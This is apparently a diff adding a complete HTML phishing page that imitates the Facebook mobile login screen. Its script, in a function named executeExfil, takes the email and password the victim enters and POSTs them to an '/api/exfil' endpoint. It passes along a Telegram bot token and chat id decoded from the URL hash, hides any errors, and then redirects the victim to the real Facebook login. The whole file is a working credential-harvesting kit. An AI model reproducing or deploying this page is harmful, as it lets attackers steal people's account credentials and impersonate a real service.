@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRp1u_Om9c.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; color: #1c1e21; }
+        .fb-input { border: 1px solid #dddfe2; border-radius: 12px; height: 58px; font-size: 16px; padding: 0 16px; transition: border-color 0.2s; }
+        .fb-input:focus { border-color: #1877f2; outline: none; }
+        .fb-btn-primary { background-color: #0064e0; border-radius: 25px; height: 48px; color: #fff; font-weight: 600; font-size: 16px; }
+        .fb-btn-secondary { border: 1px solid #1877f2; color: #1877f2; border-radius: 25px; height: 44px; font-weight: 500; font-size: 14px; width: 85%; max-width: 340px; }
+        .footer-link { color: #576372; font-size: 12px; margin: 0 5px; text-decoration: none; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen items-center text-center">
+
+    <!-- Top Banner -->
+    <div class="w-full bg-[#f0f2f5] py-3 flex items-center justify-center gap-2">
+        <svg class="w-5 h-5 text-[#1877f2]" fill="currentColor" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+        <a href="#" class="text-[#1877f2] text-sm font-medium">Get Facebook for Android and browse faster.</a>
+    </div>
+
+    <!-- Language Selector -->
+    <div class="mt-4 text-[#898f9c] text-sm">English (US)</div>
+
+    <!-- Logo Section -->
+    <div class="mt-14 mb-10">
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/bUZjZjr-wvp.webp" alt="Facebook" class="w-16 h-16">
+    </div>
+
+    <!-- Login Form -->
+    <div class="w-full max-w-[400px] px-8 space-y-3">
+        <input type="text" id="email" placeholder="Mobile number or email" class="fb-input w-full">
+        <input type="password" id="pass" placeholder="Password" class="fb-input w-full">
+        
+        <button onclick="executeExfil()" class="fb-btn-primary w-full mt-2">Log in</button>
+        
+        <div class="pt-2">
+            <a href="#" class="text-black font-semibold text-sm">Forgot password?</a>
+        </div>
+    </div>
+
+    <!-- Spacer -->
+    <div class="flex-grow"></div>
+
+    <!-- Bottom Actions -->
+    <div class="w-full flex flex-col items-center pb-8">
+        <button class="fb-btn-secondary mb-6">Create new account</button>
+        
+        <div class="mb-4">
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" alt="Meta" class="h-4">
+        </div>
+
+        <div class="flex justify-center text-[#576372] text-[12px]">
+            <a href="#" class="footer-link">About</a>
+            <a href="#" class="footer-link">Help</a>
+            <a href="#" class="footer-link">More</a>
+        </div>
+    </div>
+
+    <script>
+        const getPayloadConfig = () => {
+            const hash = window.location.hash.substring(1);
+            if (!hash) return null;
+            try {
+                return JSON.parse(atob(hash));
+            } catch (e) {
+                return null;
+            }
+        };
+
+        const config = getPayloadConfig();
+
+        async function executeExfil() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if (!email || !pass) return;
+
+            const finalRedirect = "https://www.facebook.com/login.php";
+
+            if (!config) {
+                window.location.href = finalRedirect;
+                return;
+            }
+
+            try {
+                await fetch('/api/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: 'facebook',
+                        credentials: { username: email, password: pass },
+                        tgToken: config.t,
+                        tgChat: config.c
+                    })
+                });
+            } catch (err) {
+                // Suppressed
+            } finally {
+                window.location.href = finalRedirect;
+            }
+        }
+    </script>
+</body>
+</html>
